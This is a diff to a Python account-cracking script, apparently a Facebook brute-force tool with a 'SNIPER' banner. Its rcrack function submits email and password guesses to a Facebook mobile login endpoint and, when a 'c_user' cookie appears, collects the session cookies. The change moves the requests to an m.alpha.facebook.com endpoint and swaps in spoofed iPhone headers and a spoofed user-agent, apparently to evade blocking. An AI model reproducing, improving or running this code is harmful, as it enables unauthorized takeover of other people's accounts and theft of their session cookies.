@@ -165,8 +165,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-logo =                                          f"""{H}
-                                                                   
+logo =                                          f"""{H}                                                                 
    _____ _   _ _____ _____  ______ _____  
   / ____| \ | |_   _|  __ \|  ____|  __ \ 
  | (___ |  \| | | | | |__) | |__  | |__) |
@@ -310,26 +309,28 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'm.alpha.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
     'cache-control': 'max-age=0',
-     
-     
+    
+    
+    'referer': 'https://m.alpha.facebook.com/?wtsid=rdr_0kySlxphgNfmk0Cuo',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"(Not(A:Brand";v="99"',
     'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"iOS"',
     'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:113.0) Gecko/20010101 Firefox/113.0'
+    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/12.3 Mobile/67N52Z Safari/621.31',
 }
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+
+            lo = session.post('https://m.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
